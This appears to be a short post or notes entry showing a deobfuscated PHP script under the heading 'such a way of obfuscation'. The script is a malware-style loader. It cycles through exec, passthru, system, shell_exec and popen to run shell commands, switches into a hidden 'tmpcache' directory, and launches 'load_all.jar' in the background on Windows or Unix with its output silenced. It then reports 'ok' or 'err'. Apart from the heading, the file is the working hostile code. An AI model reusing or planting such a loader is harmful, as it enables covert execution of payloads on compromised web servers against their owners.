## source code:
### such a way of obfuscation

```php
<?php


set_time_limit(1800);


function getFILE() {
    $fl = __FILE__;
    if (!substr_count($fl, "eval(")) {
        return $fl;
    }


    $fl = trim(substr($fl, 0, strpos($fl, "(")));
    return $fl;
}


function ex($in) {
    $lol = '';
    if (function_exists('exec')) {
        @exec($in, $lol);
        $lol = @join("\n", $lol);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $lol = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $lol = ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $lol = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        $lol = "";
        while (!@feof($f))
            $lol .= fread($f, 1024);
        pclose($f);
    } else
        return "Unable to execute command\n";
    return ($lol == '' ? "Query did not return anything\n" : $lol);
}


$dName = 'tmpcache';


chdir(dirname(getFILE()));
if (is_dir("../$dName")) {
    chdir("../$dName");
}


if (file_exists('tmp/bin')) {
    chdir('tmp/bin');
    if (substr_count(getFILE(), ":")) {
        ex("set JAVA_HOME=" . dirname(getFILE()) . "\\tmp");
        ex("start /B java.exe -jar load_all.jar");
    } else {
        ex("export JAVA_HOME=" . dirname(getFILE()) . "/tmp");
        ex("nohup ./java -jar load_all.jar > /dev/null &");
    }
} else {
    if (substr_count(getFILE(), ":")) {
        ex("start /B java -jar load_all.jar");
    } else {
        ex("nohup java -jar load_all.jar > /dev/null &");
    }
}


if (file_exists("h2.dat")) {
    echo "ok";
} else {
    echo "err";
}
?>

```
